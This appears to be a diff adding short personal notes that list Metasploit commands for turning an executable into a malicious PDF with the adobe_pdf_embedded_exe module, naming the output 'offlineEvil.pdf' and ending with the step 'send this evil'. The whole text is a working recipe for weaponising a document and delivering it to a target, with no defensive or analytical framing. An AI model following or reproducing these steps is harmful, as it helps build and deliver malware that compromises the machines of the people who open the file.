@@ -1,0 +1,8 @@
+1. create an exe file from offline mode
+2. metasploit :: 
+    2.1. use exploit/windows/fileformat/adobe_pdf_embedded_exe
+    2.2. set EXENAME /home/kali/Downloads/offlineMode.exe
+    2.3. set FILENAME offlineEvil.pdf
+    2.4. <change payload part>(op)
+    2.5. run --> /home/kali/.msf4/local/offlineEvil.pdf
+3. send this evil
